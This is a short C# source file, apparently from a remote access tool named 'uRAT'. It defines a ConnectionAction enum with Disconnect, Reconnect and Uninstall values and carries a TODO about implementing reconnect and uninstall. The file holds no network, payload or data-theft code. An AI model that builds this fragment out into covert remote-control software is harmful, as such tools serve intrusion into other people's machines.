using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace uRAT.CorePlugin.ConnectionManagement
{
    //TODO: implement reconnect & uninstall
    public enum ConnectionAction : byte
    {
        Disconnect = 0x0,
        Reconnect = 0x1,
        Uninstall = 0x2
    }
}
